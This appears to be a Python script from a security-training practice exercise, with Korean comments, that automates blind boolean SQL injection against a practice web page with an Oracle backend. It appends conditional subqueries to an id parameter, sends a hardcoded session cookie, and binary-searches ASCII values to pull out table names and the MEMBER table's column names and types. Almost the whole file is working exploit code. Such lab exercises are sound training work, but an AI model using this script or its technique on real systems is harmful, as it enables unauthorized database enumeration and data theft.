import requests
url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62"
jk = {
    "JSESSIONID":"F2B4A5DF6D3EED83B5D98EED7ADCCBF1"
}

def binarySearch(query):
    start = 1
    end = 127
    while start < end:
        mid = int((start+end)/2)    
        attackQuery = f"({query}) > {mid}"
        attackUrl = url + " and " + attackQuery
        res = requests.get(attackUrl, cookies=jk)        
        if "MacBook" in res.text:
            start = mid + 1                
        else:
            end = mid 
    return start

"""""
# 3. 테이블 명 
# select table_name from user_tables 
# 3-1. 테이블의 개수 : 
# select count(table_name) from user_tables 
query = "select count(table_name) from user_tables"
tableCount = binarySearch(query)
print(f"테이블 개수 : {tableCount}개")

# 3-2. 테이블 1 row 씩
#  select table_name from (select table_name, rownum ln from user_tables) where ln = {}
# 3-2-1. 1 row의 글자수
#  select length(table_name) from (select table_name, rownum ln from user_tables) where ln = {}

for ln in range(1, tableCount + 1):
    query = f"select length(table_name) from (select table_name, rownum ln from user_tables) where ln = {ln}"
    tableLength = binarySearch(query)
    print(f"{ln}번째 테이블명의 글자수 : {tableLength}글자")
# 3-2-2. 한글자씩 아스키 
#  select ascii(substr(table_name,{},1)) from (select table_name, rownum ln from user_tables) where ln = {}
    tableName = ""
    for substr in range(1, tableLength + 1):
        query = f"select ascii(substr(table_name,{substr},1)) from (select table_name, rownum ln from user_tables) where ln = {ln}"
        tableName = tableName + chr(binarySearch(query))
    print(f"{ln}번째 테이블 명 : {tableName}")
"""""

# 4. MEMBER 테이블의 컬럼 정보 추출
# 4-1. 컬럼 개수 확인
query = "select count(column_name) from user_tab_columns where table_name = 'MEMBER'"
columnCount = binarySearch(query)
print(f"MEMBER 테이블의 컬럼 개수: {columnCount}개")

# 4-2. 각 컬럼명 추출
for ln in range(1, columnCount + 1):
    # 4-2-1. 컬럼명의 길이 확인
    query = f"select length(column_name) from (select column_name, rownum ln from user_tab_columns where table_name = 'MEMBER') where ln = {ln}"
    columnLength = binarySearch(query)
    print(f"{ln}번째 컬럼명의 길이: {columnLength}글자")
    
    # 4-2-2. 컬럼명 한 글자씩 추출
    columnName = ""
    for substr in range(1, columnLength + 1):
        query = f"select ascii(substr(column_name,{substr},1)) from (select column_name, rownum ln from user_tab_columns where table_name = 'MEMBER') where ln = {ln}"
        columnName = columnName + chr(binarySearch(query))
    print(f"{ln}번째 컬럼명: {columnName}")
    
    # 4-3. 컬럼 데이터 타입 확인 (선택적)
    query = f"select length(data_type) from (select data_type, rownum ln from user_tab_columns where table_name = 'MEMBER') where ln = {ln}"
    typeLength = binarySearch(query)
    
    dataType = ""
    for substr in range(1, typeLength + 1):
        query = f"select ascii(substr(data_type,{substr},1)) from (select data_type, rownum ln from user_tab_columns where table_name = 'MEMBER') where ln = {ln}"
        dataType = dataType + chr(binarySearch(query))
    print(f"{ln}번째 컬럼 데이터 타입: {dataType}")